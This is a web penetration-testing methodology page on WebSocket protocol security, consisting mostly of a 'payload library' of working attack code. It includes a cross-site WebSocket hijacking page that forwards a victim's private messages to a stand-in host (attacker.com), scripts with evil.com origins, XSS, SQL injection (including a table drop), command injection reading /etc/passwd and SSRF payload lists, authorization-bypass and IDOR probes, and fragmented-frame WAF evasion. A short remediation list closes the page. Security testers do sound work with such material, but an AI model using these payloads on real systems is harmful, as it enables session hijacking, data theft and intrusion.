---
title: "WebSocket Protocol Security (Deep Dive)"
date: 2026-02-24
draft: false
---

# WebSocket Protocol Security (Deep Dive)

> **Severity**: High | **CWE**: CWE-345, CWE-284, CWE-89
> **OWASP**: A01:2021 – Broken Access Control | A03:2021 – Injection

---

## WebSocket Protocol vs. HTTP

WebSocket (RFC 6455) establishes a **persistent, bidirectional, full-duplex channel** over a single TCP connection. After the HTTP/1.1 upgrade handshake, the protocol operates independently of HTTP — separate authentication model, separate framing, separate proxy behavior. This creates attack surface that HTTP-focused defenses miss.

Key differences from HTTP:
- **Stateful**: session persists across messages; auth checked only at connection time (usually)
- **No CORS**: SOP doesn't apply to WebSocket connections — any origin can connect
- **No headers per message**: once connected, messages have no HTTP headers — auth must be embedded in message content or was checked at connection
- **Framing**: messages can be fragmented across frames — some IDS/WAF miss fragmented payloads
- **Opcode abuse**: binary frames, ping/pong, close frames — parsers can be confused

```
Upgrade handshake:
  GET /ws HTTP/1.1
  Host: target.com
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Key: BASE64_RANDOM
  Sec-WebSocket-Version: 13
  Origin: https://target.com  ← WAF may check this but often doesn't enforce

  HTTP/1.1 101 Switching Protocols
  Upgrade: websocket
  Sec-WebSocket-Accept: SHA1(KEY + GUID)
```

---

## Discovery Checklist

**Phase 1 — WebSocket Identification**
- [ ] Check browser DevTools → Network → WS filter for existing WebSocket connections
- [ ] Monitor Upgrade headers in HTTP traffic
- [ ] Check JavaScript for `new WebSocket(`, `io(`, `SockJS(`, `Stomp.`, `Phoenix.Socket`
- [ ] Identify WebSocket subprotocols: `Sec-WebSocket-Protocol` header
- [ ] Check for Socket.IO (adds polling fallback): `/socket.io/` path

**Phase 2 — Authentication Analysis**
- [ ] Is auth token sent in handshake URL? (`?token=`, `?auth=`)
- [ ] Is auth token sent in `Sec-WebSocket-Protocol` header (hack for browser limitations)?
- [ ] Is auth checked only at connection or on each message?
- [ ] Does re-connecting with different auth token change session?
- [ ] Can connection survive session expiry?

**Phase 3 — Message Structure**
- [ ] Identify message format: JSON, binary, custom text protocol, MessagePack
- [ ] Map all message types/events (event-driven: `{type: "message", data: ...}`)
- [ ] Identify which messages trigger server-side actions (vs. broadcast)
- [ ] Identify user-controlled fields in each message type

---

## Payload Library

### Payload 1 — Cross-Site WebSocket Hijacking (CSWSH)

```html
<!DOCTYPE html>
<!-- CSWSH: attacker page connects to victim's WebSocket using victim's cookies -->
<!-- Prerequisite: target allows cross-origin WebSocket connections (no Origin check) -->
<html>
<body>
<script>
const VICTIM_WS = "wss://target.com/ws/chat";
const EXFIL = "https://attacker.com/steal";

var ws = new WebSocket(VICTIM_WS);
// Browser automatically sends victim's cookies with WebSocket handshake
// (Same-origin cookies are sent cross-site for WebSocket upgrades)

ws.onopen = function() {
    console.log('[*] Connected to victim WebSocket');

    // Subscribe to sensitive events:
    ws.send(JSON.stringify({type: "subscribe", channel: "private"}));
    ws.send(JSON.stringify({type: "get_history", limit: 100}));
    ws.send(JSON.stringify({type: "get_profile"}));
};

ws.onmessage = function(event) {
    console.log('[*] Message:', event.data);
    // Exfiltrate all messages:
    fetch(EXFIL, {
        method: "POST",
        body: JSON.stringify({msg: event.data, ts: Date.now()}),
        mode: "no-cors"
    });
};

ws.onerror = function(e) {
    console.log('[*] Error:', e);
    // If error → Origin is likely enforced → no CSWSH
};
</script>
<p>Loading...</p>
</body>
</html>
```

```python
#!/usr/bin/env python3
"""
CSWSH test from attacker perspective — test if origin check is enforced
"""
import websocket, json, threading, time

TARGET_WS = "wss://target.com/ws"
VICTIM_COOKIE = "session=VICTIM_SESSION_VALUE"

def test_cswsh():
    headers = {
        "Cookie": VICTIM_COOKIE,
        "Origin": "https://evil.com",  # Different origin — should be rejected if protected
        "User-Agent": "Mozilla/5.0"
    }

    try:
        ws = websocket.create_connection(
            TARGET_WS,
            header=headers,
            sslopt={"check_hostname": False, "cert_reqs": 0}
        )
        print("[!!!] CSWSH POSSIBLE: Connection accepted from evil.com origin!")

        # Try to read sensitive data:
        ws.send(json.dumps({"type": "get_messages", "limit": 50}))
        ws.send(json.dumps({"type": "get_profile"}))
        ws.send(json.dumps({"type": "list_friends"}))

        # Collect responses:
        ws.settimeout(5)
        while True:
            try:
                msg = ws.recv()
                print(f"[DATA] {msg[:200]}")
            except:
                break
        ws.close()
    except Exception as e:
        print(f"[ ] Connection rejected (likely Origin check enforced): {e}")

# Also test without Origin header:
def test_no_origin():
    try:
        ws = websocket.create_connection(
            TARGET_WS,
            header={"Cookie": VICTIM_COOKIE},
            sslopt={"check_hostname": False, "cert_reqs": 0}
        )
        print("[!] Connection accepted without Origin header")
        ws.close()
    except Exception as e:
        print(f"[ ] No-Origin rejected: {e}")

test_cswsh()
test_no_origin()
```

### Payload 2 — Authentication Bypass at Reconnect

```python
#!/usr/bin/env python3
"""
Test if WebSocket auth is re-checked on reconnect
If auth token expires but existing connection persists → zombie connection
If new connection with expired token is accepted → auth bypass
"""
import websocket, json, time, jwt as pyjwt
from datetime import datetime, timedelta

TARGET_WS = "wss://target.com/ws"

# Scenario 1: Connect with valid token, let it expire, continue using connection:
def test_token_expiry_on_existing_connection():
    # Connect with valid short-lived token (e.g., 5 min token):
    VALID_TOKEN = "eyJ..."  # your valid JWT
    ws = websocket.create_connection(
        TARGET_WS,
        header={"Authorization": f"Bearer {VALID_TOKEN}"},
        sslopt={"check_hostname": False, "cert_reqs": 0}
    )
    print("[*] Connected with valid token")

    # Wait for token to expire (or modify exp in a test environment):
    print("[*] Waiting 2 minutes...")
    time.sleep(120)

    # Send message with expired token — connection should be kicked:
    ws.send(json.dumps({"type": "get_sensitive_data"}))
    try:
        response = ws.recv()
        print(f"[!!!] Data received with expired token: {response[:200]}")
    except Exception as e:
        print(f"[ ] Connection closed after token expiry: {e}")

# Scenario 2: Reconnect with expired/invalid token:
def test_expired_token_reconnect():
    # Create expired JWT (if you know the secret — for testing your own app):
    EXPIRED_PAYLOAD = {
        "sub": "user123",
        "exp": int((datetime.now() - timedelta(hours=1)).timestamp()),  # expired 1 hour ago
        "iat": int((datetime.now() - timedelta(hours=2)).timestamp()),
    }
    # Expired token string:
    EXPIRED_TOKEN = "eyJ..."  # capture a real expired token

    try:
        ws = websocket.create_connection(
            TARGET_WS,
            header={"Authorization": f"Bearer {EXPIRED_TOKEN}"},
            sslopt={"check_hostname": False, "cert_reqs": 0}
        )
        print("[!!!] Connected with EXPIRED token!")
        ws.send(json.dumps({"type": "ping"}))
        print(f"[!!!] Response: {ws.recv()}")
        ws.close()
    except Exception as e:
        print(f"[ ] Expired token rejected: {e}")

# Scenario 3: Token in URL parameter (may be logged):
def test_token_in_url():
    TOKEN = "VALID_TOKEN"
    ws_url = f"wss://target.com/ws?token={TOKEN}"
    ws = websocket.create_connection(ws_url,
        sslopt={"check_hostname": False, "cert_reqs": 0})
    print(f"[*] Connected via URL token")
    # Issue: token visible in server logs, proxy logs, Referer headers
    ws.close()
```

### Payload 3 — Message-Level Injection

```python
#!/usr/bin/env python3
"""
Test injection payloads in WebSocket message fields
"""
import websocket, json, time

TARGET_WS = "wss://target.com/ws/chat"
AUTH_TOKEN = "YOUR_VALID_TOKEN"

ws = websocket.create_connection(
    TARGET_WS,
    header={"Authorization": f"Bearer {AUTH_TOKEN}"},
    sslopt={"check_hostname": False, "cert_reqs": 0}
)

def send_and_recv(payload):
    ws.send(json.dumps(payload))
    time.sleep(0.5)
    try:
        ws.settimeout(2)
        return ws.recv()
    except:
        return "(no response)"

# XSS via message content:
xss_payloads = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "${alert(1)}",   # template literal injection in JS client
    "{{constructor.constructor('alert(1)')()}}",  # AngularJS CSTI via WS message
]

print("[*] Testing XSS in message content:")
for xss in xss_payloads:
    r = send_and_recv({"type": "send_message", "room": "general", "content": xss})
    print(f"  {xss[:40]} → {r[:100]}")

# SQL injection via search/query messages:
sqli_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE messages-- -",
    "' UNION SELECT null,password FROM users-- -",
    "' AND SLEEP(3)-- -",
]

print("\n[*] Testing SQLi in search:")
for sqli in sqli_payloads:
    start = time.time()
    r = send_and_recv({"type": "search_messages", "query": sqli})
    elapsed = time.time() - start
    print(f"  {sqli[:40]} → {elapsed:.1f}s, {r[:100]}")

# Command injection via filenames/paths in messages:
cmdi_payloads = [
    "test; id",
    "test | cat /etc/passwd",
    "test`id`",
    "$(id)",
]

print("\n[*] Testing CMDi in file operations:")
for cmdi in cmdi_payloads:
    r = send_and_recv({"type": "upload_file", "filename": cmdi, "content": "test"})
    print(f"  {cmdi} → {r[:100]}")

# SSRF via URL fields:
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/",
    "http://internal.corp.net:8080/admin",
    "file:///etc/passwd",
]

print("\n[*] Testing SSRF via URL fields:")
for url in ssrf_payloads:
    r = send_and_recv({"type": "fetch_preview", "url": url})
    print(f"  {url} → {r[:200]}")

ws.close()
```

### Payload 4 — WebSocket Authorization Bypass

```python
#!/usr/bin/env python3
"""
Test authorization on WebSocket message types
Many apps check auth at connection but not per-message
"""
import websocket, json, time

TARGET_WS = "wss://target.com/ws"
USER_TOKEN = "USER_LEVEL_TOKEN"  # non-admin token

ws = websocket.create_connection(
    TARGET_WS,
    header={"Authorization": f"Bearer {USER_TOKEN}"},
    sslopt={"check_hostname": False, "cert_reqs": 0}
)

def send(payload):
    ws.send(json.dumps(payload))
    time.sleep(0.3)
    try:
        ws.settimeout(2)
        return ws.recv()
    except: return "(no response / connection closed)"

# Test admin message types with user token:
admin_messages = [
    # User management:
    {"type": "admin:list_users"},
    {"type": "admin:get_user", "userId": "admin"},
    {"type": "admin:delete_user", "userId": "victim_user"},
    {"type": "admin:change_role", "userId": "ATTACKER_USER", "role": "admin"},
    # System operations:
    {"type": "system:exec", "cmd": "id"},
    {"type": "system:logs"},
    {"type": "debug:dump_state"},
    # Data access:
    {"type": "get_all_messages"},
    {"type": "subscribe", "channel": "admin"},
    {"type": "read_private_messages", "userId": "OTHER_USER"},
]

print("[*] Testing admin/privileged message types:")
for msg in admin_messages:
    r = send(msg)
    # Look for anything other than "unauthorized" or "forbidden":
    if not any(x in r.lower() for x in ["unauthorized", "forbidden", "permission", "error"]):
        print(f"  [!!!] {msg['type']} → {r[:200]}")
    else:
        print(f"  [ ] {msg['type']}: {r[:80]}")

# IDOR via WebSocket — access other users' data:
print("\n[*] Testing IDOR via WebSocket:")
for user_id in ["1", "2", "3", "admin", "VICTIM_USER_ID"]:
    r = send({"type": "get_private_data", "userId": user_id})
    if "email" in r or "password" in r or "phone" in r:
        print(f"  [!!!] IDOR: userId={user_id} → {r[:200]}")
    else:
        print(f"  [ ] userId={user_id}: {r[:60]}")

ws.close()
```

### Payload 5 — Frame-Level Protocol Attacks

```python
#!/usr/bin/env python3
"""
WebSocket frame-level attacks
"""
import socket, ssl, struct, base64, hashlib, os, time

def websocket_handshake(host, port, path="/ws", token=None, use_tls=True):
    """Raw WebSocket handshake"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))

    key = base64.b64encode(os.urandom(16)).decode()
    expected_accept = base64.b64encode(
        hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
    ).decode()

    headers = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}:{port}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
        "Origin: https://evil.com",  # Test origin bypass
    ]
    if token:
        headers.append(f"Authorization: Bearer {token}")

    sock.send(("\r\n".join(headers) + "\r\n\r\n").encode())
    response = sock.recv(4096).decode()

    if "101 Switching Protocols" in response:
        print(f"[+] Handshake OK")
        return sock
    else:
        print(f"[-] Handshake failed: {response[:200]}")
        return None

def send_frame(sock, payload, opcode=0x01, masked=True):
    """Send a WebSocket frame"""
    payload_bytes = payload.encode() if isinstance(payload, str) else payload
    length = len(payload_bytes)

    header = bytes([0x80 | opcode])  # FIN + opcode

    if length < 126:
        header += bytes([0x80 | length] if masked else [length])
    elif length < 65536:
        header += bytes([0x80 | 126] if masked else [126]) + struct.pack("!H", length)
    else:
        header += bytes([0x80 | 127] if masked else [127]) + struct.pack("!Q", length)

    if masked:
        mask = os.urandom(4)
        masked_payload = bytes([b ^ mask[i % 4] for i, b in enumerate(payload_bytes)])
        sock.send(header + mask + masked_payload)
    else:
        sock.send(header + payload_bytes)

# Fragmented frame injection (WAF bypass):
def send_fragmented(sock, payload):
    """Split payload across multiple frames"""
    mid = len(payload) // 2
    part1 = payload[:mid].encode()
    part2 = payload[mid:].encode()

    # First fragment: FIN=0, opcode=text(1)
    header1 = bytes([0x01])  # FIN=0, opcode=1
    mask1 = os.urandom(4)
    header1 += bytes([0x80 | len(part1)])
    masked1 = bytes([b ^ mask1[i % 4] for i, b in enumerate(part1)])
    sock.send(header1 + mask1 + masked1)

    # Continuation frame: FIN=1, opcode=continuation(0)
    header2 = bytes([0x80])  # FIN=1, opcode=0
    mask2 = os.urandom(4)
    header2 += bytes([0x80 | len(part2)])
    masked2 = bytes([b ^ mask2[i % 4] for i, b in enumerate(part2)])
    sock.send(header2 + mask2 + masked2)

# Test: connect and send fragmented SQLi (may bypass WAF):
sock = websocket_handshake("target.com", 443, "/ws", token="TOKEN", use_tls=True)
if sock:
    # Send normal message:
    send_frame(sock, json.dumps({"type": "search", "query": "test"}))

    # Send fragmented injection:
    payload = json.dumps({"type": "search", "query": "' OR '1'='1"})
    send_fragmented(sock, payload)
    time.sleep(1)
    print(f"Response: {sock.recv(4096)}")
    sock.close()
```

### Payload 6 — Socket.IO Specific Attacks

```python
#!/usr/bin/env python3
"""
Socket.IO-specific attack patterns
Socket.IO adds event-based protocol on top of WebSocket
"""
import socketio, time

# Socket.IO client:
sio = socketio.Client()

TARGET = "https://target.com"
AUTH_TOKEN = "USER_TOKEN"

@sio.event
def connect():
    print('[*] Connected to Socket.IO server')
    # Enumerate common event names:
    for event in ['join_room', 'subscribe', 'get_messages', 'admin:users',
                  'debug', 'system', 'broadcast']:
        try:
            sio.emit(event, {})
        except: pass

@sio.event
def message(data):
    print(f'[DATA] message: {data}')

@sio.on('*')  # Catch all events:
def catch_all(event, data):
    print(f'[EVENT] {event}: {data}')

# Connect with auth:
try:
    sio.connect(TARGET, auth={"token": AUTH_TOKEN},
                transports=['websocket'])  # force WebSocket, skip polling
except Exception as e:
    print(f"Error: {e}")

# Test event namespace escalation:
# Socket.IO supports namespaces: /admin, /system
admin_sio = socketio.Client()
try:
    admin_sio.connect(TARGET + '/admin', auth={"token": AUTH_TOKEN},
                      transports=['websocket'])
    print("[!!!] Connected to /admin namespace with user token!")
    admin_sio.emit('list_users', {})
    time.sleep(2)
    admin_sio.disconnect()
except Exception as e:
    print(f"[ ] Admin namespace rejected: {e}")

# CSWSH via Socket.IO polling (HTTP-based fallback):
import requests
r = requests.get(f"{TARGET}/socket.io/?EIO=4&transport=polling",
                 cookies={"session": "VICTIM_SESSION"})
print(f"[*] Polling response (CSWSH test): {r.status_code} {r.text[:100]}")

sio.disconnect()
```

---

## Tools

```bash
# wscat — WebSocket command-line client:
npm install -g wscat
wscat -c "wss://target.com/ws" \
  -H "Authorization: Bearer TOKEN" \
  -H "Origin: https://target.com"

# websocat — versatile WebSocket tool (nc equivalent):
cargo install websocat
# Or: apt install websocat
websocat "wss://target.com/ws" --header="Authorization: Bearer TOKEN"
# Pipe stdin → WebSocket:
echo '{"type":"get_data"}' | websocat "wss://target.com/ws" -H "Authorization: Bearer TOKEN"

# wsrepl — interactive WebSocket REPL with history:
pip3 install wsrepl
wsrepl -u "wss://target.com/ws" --headers "Authorization: Bearer TOKEN"

# Burp Suite — WebSocket interception:
# Proxy → WebSockets history → intercept WS messages
# Repeater supports WebSocket (repeater type: WebSocket)
# Intruder: send WebSocket message to Intruder for fuzzing

# wsfuzz — WebSocket fuzzer:
pip3 install wsfuzz

# OWASP WebSocket security cheat sheet:
# https://cheatsheetseries.owasp.org/cheatsheets/WebSockets_Security_Cheat_Sheet.html

# Detect WebSocket in passive recon:
curl -si "https://target.com/" | grep -i "upgrade\|websocket"
grep -r "WebSocket\|ws://" site_js/ 2>/dev/null | head -20

# Socket.IO client for testing:
pip3 install python-socketio
npm install socket.io-client  # JS alternative

# Test CSWSH with Burp Collaborator integration:
# Connect to victim WS using collaborator URL as exfil:
python3 -c "
import websocket, json
ws = websocket.create_connection('wss://target.com/ws',
    header={'Cookie': 'session=VICTIM_SESSION', 'Origin': 'https://evil.com'},
    sslopt={'check_hostname': False, 'cert_reqs': 0})
ws.send(json.dumps({'type': 'get_all'}))
print(ws.recv())
ws.close()
"
```

---

## Remediation Reference

- **Origin validation in WebSocket handshake**: check the `Origin` header on the server during the WebSocket upgrade — reject connections from unauthorized origins; this is the primary CSWSH mitigation
- **CSRF token in handshake**: if cookie-based auth is used, require a CSRF token as a URL parameter or in `Sec-WebSocket-Protocol` during handshake
- **Re-authenticate on reconnect**: validate auth token on every new WebSocket connection, not just the first — do not trust that "existing connection = authenticated"
- **Per-message authorization**: check authorization for every message that triggers a privileged action — connection-level auth is not sufficient for event-based systems
- **Sanitize all message fields**: treat WebSocket message content as untrusted input — apply the same injection prevention as REST API parameters
- **Message validation schema**: define and enforce a schema for each message type; reject malformed or unexpected fields
- **Rate limiting on message processing**: apply rate limits on expensive or sensitive operations triggered via WebSocket messages
- **TLS for all WebSocket connections**: always use `wss://` (WebSocket Secure) — `ws://` transmits in cleartext; enforce this server-side by rejecting non-TLS connections

*Part of the Web Application Penetration Testing Methodology series.*
